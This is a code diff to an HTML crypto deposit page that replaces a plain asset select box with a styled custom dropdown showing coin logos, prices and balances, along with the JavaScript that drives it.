@@ -7,6 +7,10 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        /* Smooth scrolling for inside the premium custom selector menu list */
+        #customSelectMenu::-webkit-scrollbar { width: 4px; }
+        #customSelectMenu::-webkit-scrollbar-track { background: #121212; }
+        #customSelectMenu::-webkit-scrollbar-thumb { background: #262626; border-radius: 99px; }
     </style>
 </head>
 <body class="text-white min-h-screen flex flex-col justify-between pb-8">
@@ -20,7 +24,6 @@
     </header>
 
     <main class="max-w-md w-full mx-auto px-4 mt-6 flex-grow">
-        <!-- Input Form Screen -->
         <div id="formCard" class="bg-[#141414] border border-[#222] rounded-2xl p-6 shadow-2xl">
             <h2 class="text-xl font-bold tracking-tight mb-1">Fund Allocation</h2>
             <p class="text-xs text-neutral-400 mb-6">Select your transaction profile parameters.</p>
@@ -30,18 +33,194 @@
             <form id="investForm" class="space-y-5">
                 <div>
                     <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Select Crypto Asset</label>
-                    <select id="assetSelect" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm">
-                        <option value="USDT (TRC20)">USDT (Tron Network - TRC20)</option>
-                        <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
-                        <option value="Ethereum (ETH)">Ethereum (ERC20)</option>
-                        <option value="USDC (ERC20)">USD Coin (Ethereum - ERC20)</option>
-                        <option value="USDT (ERC20)">USDT (Ethereum - ERC20)</option>
-                        <option value="Solana (SOL)">Solana (SOL)</option>
-                        <option value="Litecoin (LTC)">Litecoin (LTC)</option>
-                        <option value="XRP (XRP)">XRP (XRP)</option>
-                        <option value="Tron (TRX)">Tron (TRX)</option>
-                        <option value="Dash (DASH)">Dash (DASH)</option>
-                    </select>
+                    
+                    <div class="relative">
+                        <button id="customSelectTrigger" type="button" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl p-3 flex items-center justify-between text-left focus:outline-none focus:border-[#E82127] transition-all">
+                            <div id="selectedAssetContainer" class="flex items-center space-x-3">
+                                <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-6 h-6 rounded-full" alt="USDT">
+                                <div>
+                                    <div class="flex items-center space-x-1.5">
+                                        <span class="text-sm font-bold text-white">USDT</span>
+                                        <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">Tron</span>
+                                    </div>
+                                    <p class="text-[10px] text-neutral-400 mt-0.5">$0.99 <span class="text-red-500">-0.15%</span></p>
+                                </div>
+                            </div>
+                            <svg class="w-4 h-4 text-neutral-500 transition-transform duration-200" id="dropdownArrow" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                            </svg>
+                        </button>
+
+                        <input type="hidden" id="assetSelect" value="USDT (TRC20)">
+
+                        <div id="customSelectMenu" class="hidden absolute left-0 right-0 mt-2 bg-[#121212] border border-[#222] rounded-xl shadow-2xl overflow-hidden z-50 max-h-72 overflow-y-auto divide-y divide-[#1c1c1c]">
+                            
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="USDT (TRC20)" data-name="USDT" data-network="Tron" data-img="https://assets.coingecko.com/coins/images/325/large/Tether.png" data-rate="$0.99" data-change="-0.15%" data-balance="54,225.17" data-fiat="$53,712.61">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-6 h-6 rounded-full" alt="USDT">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">USDT</span>
+                                            <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">Tron</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$0.99 <span class="text-red-500">-0.15%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">54,225.17</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$53,712.61</p>
+                                </div>
+                            </div>
+
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Bitcoin (BTC)" data-name="BTC" data-network="" data-img="https://assets.coingecko.com/coins/images/1/large/bitcoin.png" data-rate="$62,871.80" data-change="-7.22%" data-balance="0.423267" data-fiat="$28,615.71">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/1/large/bitcoin.png" class="w-6 h-6 rounded-full" alt="BTC">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">BTC</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$62,871.80 <span class="text-red-500">-7.22%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">0.423267</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$28,615.71</p>
+                                </div>
+                            </div>
+
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Ethereum (ETH)" data-name="ETH" data-network="ERC20" data-img="https://assets.coingecko.com/coins/images/279/large/ethereum.png" data-rate="$3,680.52" data-change="-6.94%" data-balance="0.82176" data-fiat="$3,024.50">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" class="w-6 h-6 rounded-full" alt="ETH">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">ETH</span>
+                                            <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">ERC20</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$3,680.52 <span class="text-red-500">-6.94%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">0.82176</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$3,024.50</p>
+                                </div>
+                            </div>
+
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="USDC (ERC20)" data-name="USDC" data-network="ERC20" data-img="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" data-rate="$1.00" data-change="0.00%" data-balance="0" data-fiat="$0.00">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" class="w-6 h-6 rounded-full" alt="USDC">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">USD Coin</span>
+                                            <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">ERC20</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$1.00 <span class="text-neutral-500">0.00%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">0</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$0.00</p>
+                                </div>
+                            </div>
+
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="USDT (ERC20)" data-name="USDT" data-network="ERC20" data-img="https://assets.coingecko.com/coins/images/325/large/Tether.png" data-rate="$1.00" data-change="-0.02%" data-balance="0" data-fiat="$0.00">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-6 h-6 rounded-full" alt="USDT">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">USDT</span>
+                                            <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">ERC20</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$1.00 <span class="text-red-500">-0.02%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">0</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$0.00</p>
+                                </div>
+                            </div>
+
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Solana (SOL)" data-name="SOL" data-network="" data-img="https://assets.coingecko.com/coins/images/4128/large/solana.png" data-rate="$142.15" data-change="-4.11%" data-balance="0" data-fiat="$0.00">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" class="w-6 h-6 rounded-full" alt="SOL">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">Solana</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$142.15 <span class="text-red-500">-4.11%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">0</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$0.00</p>
+                                </div>
+                            </div>
+
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Litecoin (LTC)" data-name="LTC" data-network="" data-img="https://assets.coingecko.com/coins/images/2/large/litecoin.png" data-rate="$78.40" data-change="-2.55%" data-balance="0" data-fiat="$0.00">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/2/large/litecoin.png" class="w-6 h-6 rounded-full" alt="LTC">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">Litecoin</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$78.40 <span class="text-red-500">-2.55%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">0</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$0.00</p>
+                                </div>
+                            </div>
+
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="XRP (XRP)" data-name="XRP" data-network="" data-img="https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png" data-rate="$0.49" data-change="-1.20%" data-balance="0" data-fiat="$0.00">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png" class="w-6 h-6 rounded-full" alt="XRP">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">XRP</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$0.49 <span class="text-red-500">-1.20%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">0</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$0.00</p>
+                                </div>
+                            </div>
+
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Tron (TRX)" data-name="TRX" data-network="" data-img="https://assets.coingecko.com/coins/images/1094/large/tron-logo.png" data-rate="$0.12" data-change="-3.5%" data-balance="2,789.03" data-fiat="$334.68">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/1094/large/tron-logo.png" class="w-6 h-6 rounded-full" alt="TRX">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">TRX</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$0.12 <span class="text-red-500">-3.5%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">2,789.03</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$334.68</p>
+                                </div>
+                            </div>
+
+                            <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Dash (DASH)" data-name="DASH" data-network="" data-img="https://assets.coingecko.com/coins/images/19/large/dash.png" data-rate="$24.10" data-change="-1.85%" data-balance="0" data-fiat="$0.00">
+                                <div class="flex items-center space-x-3">
+                                    <img src="https://assets.coingecko.com/coins/images/19/large/dash.png" class="w-6 h-6 rounded-full" alt="DASH">
+                                    <div>
+                                        <div class="flex items-center space-x-1.5">
+                                            <span class="text-sm font-bold text-white">Dash</span>
+                                        </div>
+                                        <p class="text-[10px] text-neutral-400 mt-0.5">$24.10 <span class="text-red-500">-1.85%</span></p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs font-bold text-neutral-200 font-mono">0</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">$0.00</p>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
                 </div>
 
                 <div>
@@ -60,10 +239,8 @@
             </form>
         </div>
 
-        <!-- Automatic Crypto Payment Screen -->
         <div id="paymentCard" class="hidden bg-[#141414] border border-[#222] rounded-2xl p-5 shadow-2xl text-center space-y-5">
             
-            <!-- Warning Banner -->
             <div class="bg-[#241a0d] border border-[#3d2a13] rounded-xl p-3 text-left flex items-start space-x-2.5">
                 <span class="text-[#f0a23e] text-sm mt-0.5">⚠️</span>
                 <p class="text-[11px] text-[#f0a23e] font-medium leading-normal">
@@ -71,14 +248,12 @@
                 </p>
             </div>
 
-            <!-- QR Container -->
             <div class="bg-white rounded-2xl p-4 inline-block shadow-lg">
                 <img id="qrCodeImg" src="" alt="Deposit QR Code" class="w-44 h-44 mx-auto">
                 <p class="text-[11px] text-neutral-500 font-bold tracking-tight mt-2" id="walletLabel">USDT (TRC20)</p>
             </div>
 
             <div class="space-y-3 text-left">
-                <!-- Amount Segment -->
                 <div>
                     <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-1.5">Amount Due</label>
                     <div id="payAmountDisplay" class="bg-[#1c1c1c] border border-[#282828] rounded-xl px-4 py-3 text-sm font-mono font-bold text-white">
@@ -86,7 +261,6 @@
                     </div>
                 </div>
 
-                <!-- Destination Wallet with Copy Action -->
                 <div>
                     <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-1.5">Your Destination Address</label>
                     <div class="bg-[#1c1c1c] border border-[#282828] rounded-xl p-3 font-mono text-xs text-neutral-300 flex justify-between items-center gap-3">
@@ -101,7 +275,6 @@
                 </div>
             </div>
 
-            <!-- Deep Link Action Button -->
             <div class="pt-2 space-y-2.5">
                 <a id="trustWalletLink" href="#" class="w-full bg-[#0052FF] hover:bg-[#0045d8] text-white font-medium py-3.5 rounded-xl block transition-all text-sm shadow-lg tracking-wide font-semibold">
                     Pay via Trust Wallet
@@ -175,6 +348,55 @@
             window.location.href = "index.html";
         }
 
+        // Custom Dropdown Interactive Handling Logic
+        const selectTrigger = document.getElementById('customSelectTrigger');
+        const selectMenu = document.getElementById('customSelectMenu');
+        const dropdownArrow = document.getElementById('dropdownArrow');
+        const hiddenInput = document.getElementById('assetSelect');
+        const selectedAssetContainer = document.getElementById('selectedAssetContainer');
+
+        selectTrigger.addEventListener('click', (e) => {
+            e.stopPropagation();
+            selectMenu.classList.toggle('hidden');
+            dropdownArrow.classList.toggle('rotate-180');
+        });
+
+        document.addEventListener('click', () => {
+            selectMenu.classList.add('hidden');
+            dropdownArrow.classList.remove('rotate-180');
+        });
+
+        document.querySelectorAll('.asset-option').forEach(option => {
+            option.addEventListener('click', function() {
+                const value = this.getAttribute('data-value');
+                const name = this.getAttribute('data-name');
+                const network = this.getAttribute('data-network');
+                const img = this.getAttribute('data-img');
+                const rate = this.getAttribute('data-rate');
+                const change = this.getAttribute('data-change');
+
+                // Update original variable target reference safely
+                hiddenInput.value = value;
+
+                const badgeHtml = network ? `<span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">${network}</span>` : '';
+                const changeColor = change.includes('-') ? 'text-red-500' : 'text-emerald-500';
+
+                selectedAssetContainer.innerHTML = `
+                    <img src="${img}" class="w-6 h-6 rounded-full" alt="${name}">
+                    <div>
+                        <div class="flex items-center space-x-1.5">
+                            <span class="text-sm font-bold text-white">${name}</span>
+                            ${badgeHtml}
+                        </div>
+                        <p class="text-[10px] text-neutral-400 mt-0.5">${rate} <span class="${changeColor}">${change}</span></p>
+                    </div>
+                `;
+
+                selectMenu.classList.add('hidden');
+                dropdownArrow.classList.remove('rotate-180');
+            });
+        });
+
         async function copyWalletAddress() {
             const addressText = document.getElementById('walletAddress').innerText;
             const copyIcon = document.getElementById('copyIcon');
@@ -229,16 +451,13 @@
                 const result = await response.json();
 
                 if (result.status === "success") {
-                    // Swap layout items systematically based on selected coin configurations
                     document.getElementById('walletAddress').innerText = selectedWallet.address;
                     document.getElementById('payAmountDisplay').innerText = `${amount} USD (${asset.split(' ')[0]})`;
                     document.getElementById('bannerAsset').innerText = selectedWallet.label;
                     document.getElementById('walletLabel').innerText = selectedWallet.label;
                     
-                    // Direct dynamic image generation via standard API mapping
                     document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=176x176&data=${encodeURIComponent(selectedWallet.address)}`;
                     
-                    // Update deep link app execution scheme structure
                     document.getElementById('trustWalletLink').href = `${selectedWallet.scheme}?amount=${amount}`;
 
                     document.getElementById('formCard').classList.add('hidden');
